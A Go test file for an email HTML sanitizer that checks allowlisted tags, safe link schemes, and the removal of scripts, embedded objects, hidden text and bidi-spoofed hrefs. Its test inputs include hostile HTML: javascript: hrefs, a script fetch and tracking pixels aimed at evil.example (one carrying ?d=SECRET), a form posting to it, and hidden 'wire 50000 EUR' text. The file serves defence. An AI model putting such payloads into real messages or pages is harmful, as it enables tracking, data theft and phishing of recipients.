// SPDX-FileCopyrightText: 2026 Martin <dev@amsys.cz>
// SPDX-License-Identifier: MIT

package mime

import (
	"reflect"
	"testing"
)

// TestAllowHTML_Rules holds the five rules of D5.5. The send
// confirmation shows the HTML part as text and lists its links, so
// the part may hold no style, no remote URL other than a link, and no
// element that hides text. Each case gives the clean output and the
// count of removed elements and attributes. A second pass over each
// output removes nothing and changes nothing, because send uses the
// same function to check a stored draft.
//
// arch: D5.5, D5.2
func TestAllowHTML_Rules(t *testing.T) {
	cases := []struct {
		name, in, want string
		removed        int
	}{
		// Rule 1: the allowlist stays as it is.
		{"allowlist stays", `<p>Hi <b>A</b> <strong>B</strong> <i>C</i> <em>D</em> <u>E</u><br></p><ul><li>x</li></ul><ol><li>y</li></ol><blockquote>q</blockquote>`,
			`<p>Hi <b>A</b> <strong>B</strong> <i>C</i> <em>D</em> <u>E</u><br></p><ul><li>x</li></ul><ol><li>y</li></ol><blockquote>q</blockquote>`, 0},
		{"plain text", "See you at lunch.", "See you at lunch.", 0},
		{"entities stay escaped", `<p>a &lt;b&gt; &amp; c</p>`, `<p>a &lt;b&gt; &amp; c</p>`, 0},

		// Rule 2: href with http, https or mailto stays; nothing else.
		{"https link", `<a href="https://x.example/a?b=1&amp;c=2">x</a>`, `<a href="https://x.example/a?b=1&amp;c=2">x</a>`, 0},
		{"http link", `<a href="http://x.example/">x</a>`, `<a href="http://x.example/">x</a>`, 0},
		{"mailto link", `<a href="MAILTO:ann@example.test">ann</a>`, `<a href="MAILTO:ann@example.test">ann</a>`, 0},
		{"javascript href", `<a href="javascript:alert(1)">x</a>`, `<a>x</a>`, 1},
		{"entity javascript href", `<a href="java&#115;cript:alert(1)">x</a>`, `<a>x</a>`, 1},
		{"tab in scheme", "<a href=\"ht\ttps://evil.example/\">x</a>", `<a>x</a>`, 1},
		{"leading space", `<a href=" https://evil.example/">x</a>`, `<a>x</a>`, 1},
		{"relative href", `<a href="/path">x</a>`, `<a>x</a>`, 1},
		{"data href", `<a href="data:text/html,hi">x</a>`, `<a>x</a>`, 1},
		{"other attributes on a", `<a href="https://x.example/" title="t" style="color:red" onclick="f()">x</a>`, `<a href="https://x.example/">x</a>`, 3},
		// The tokenizer keeps the first of two equal attributes, as a
		// browser does, so the second href never reaches the rules.
		{"second href", `<a href="https://x.example/" href="https://y.example/">x</a>`, `<a href="https://x.example/">x</a>`, 0},
		{"style on p", `<p style="display:none">wire 50000 EUR</p>`, `<p>wire 50000 EUR</p>`, 1},
		{"hidden attribute", `<p hidden>SECRET</p>`, `<p>SECRET</p>`, 1},

		// Rule 3: these go with their content.
		{"script", `ok<script>fetch("https://evil.example/")</script>`, "ok", 1},
		{"style block", `<style>p{background:url(https://evil.example/p.gif)}</style><p>ok</p>`, "<p>ok</p>", 1},
		{"head and title", `<html><head><title>SECRET</title></head><body><p>ok</p></body></html>`, "<p>ok</p>", 3},
		{"template", `<template><p>SECRET</p></template>ok`, "ok", 1},
		{"iframe", `<iframe src="https://evil.example/">SECRET</iframe>ok`, "ok", 1},
		{"object", `<object data="https://evil.example/"><p>SECRET</p></object>ok`, "ok", 1},
		{"embed is void", `<embed src="https://evil.example/"><p>ok</p>`, "<p>ok</p>", 1},
		{"svg", `<svg><image href="https://evil.example/p.gif"/><text>SECRET</text></svg>ok`, "ok", 1},
		{"math", `<math><mi>SECRET</mi></math>ok`, "ok", 1},
		{"noscript", `<noscript><img src="https://evil.example/p.gif"></noscript>ok`, "ok", 1},
		{"nested drop", `<object><object>SECRET</object>SECRET</object>ok`, "ok", 1},

		// Rule 4: other elements go and their text stays. A removed
		// element counts once, with its attributes.
		{"img", `<p>See you at lunch.</p><img src="https://evil.example/p.gif?d=SECRET">`, "<p>See you at lunch.</p>", 1},
		{"div and span", `<div style="color:#fff"><span>text</span></div>`, "text", 2},
		{"table", `<table><tr><td>a</td></tr></table>`, "a", 3},
		{"xmp text escaped", `<xmp><img src=x></xmp>`, "&lt;img src=x&gt;", 1},
		{"form input", `<form action="https://evil.example/"><input value="SECRET"></form>`, "", 2},

		// Rule 5: comments go. A doctype goes too.
		{"comment", `ok<!-- SECRET -->`, "ok", 1},
		{"doctype", `<!DOCTYPE html><p>ok</p>`, "<p>ok</p>", 1},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, removed := AllowHTML(c.in)
			if got != c.want || removed != c.removed {
				t.Errorf("AllowHTML(%q) = %q, %d; want %q, %d", c.in, got, removed, c.want, c.removed)
			}
			again, n := AllowHTML(got)
			if again != got || n != 0 {
				t.Errorf("second pass over %q = %q, %d; want no change", got, again, n)
			}
		})
	}
}

// TestAllowHTML_BidiHref: a bidi control character or a zero-width
// character inside an href can make the link text read as one target
// while a browser opens another. AllowHTML must refuse the href, the
// same as it refuses a control character (DRV.13).
//
// arch: D5.5, D5.2, DRV.13
func TestAllowHTML_BidiHref(t *testing.T) {
	cases := []struct{ name, in string }{
		{"RLO", "<a href=\"https://x.example/\u202eabc\">x</a>"},
		{"LRE", "<a href=\"https://x.example/\u202aabc\">x</a>"},
		{"RLI", "<a href=\"https://x.example/\u2066abc\">x</a>"},
		{"zero width space", "<a href=\"https://x.example/\u200babc\">x</a>"},
		{"zero width joiner", "<a href=\"https://x.example/\u200dabc\">x</a>"},
		{"BOM", "<a href=\"https://x.example/\ufeffabc\">x</a>"},
		{"ALM", "<a href=\"https://x.example/\u061cabc\">x</a>"},
		{"LRM", "<a href=\"https://x.example/\u200eabc\">x</a>"},
		{"word joiner", "<a href=\"https://x.example/\u2060abc\">x</a>"},
		{"invisible separator", "<a href=\"https://x.example/\u2063abc\">x</a>"},
		{"Mongolian vowel separator", "<a href=\"https://x.example/\u180eabc\">x</a>"},
		{"soft hyphen", "<a href=\"https://x.example/\u00adabc\">x</a>"},
		{"entity-encoded RLO", "<a href=\"https://x.example/&#x202e;abc\">x</a>"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, removed := AllowHTML(c.in)
			if got != "<a>x</a>" || removed != 1 {
				t.Errorf("AllowHTML(%q) = %q, %d; want %q, 1", c.in, got, removed, "<a>x</a>")
			}
		})
	}
}

// TestHTMLLinks_ListsEachHref: the send confirmation lists each link
// target of the clean HTML part, in source order (D5.5).
//
// arch: D5.5, D5.2
func TestHTMLLinks_ListsEachHref(t *testing.T) {
	clean, _ := AllowHTML(`<p><a href="https://a.example/?x=1&amp;y=2">a</a> <a>b</a> <a href="mailto:ann@example.test">c</a></p>`)
	got := HTMLLinks(clean)
	want := []string{"https://a.example/?x=1&y=2", "mailto:ann@example.test"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("HTMLLinks(%q) = %q, want %q", clean, got, want)
	}
}
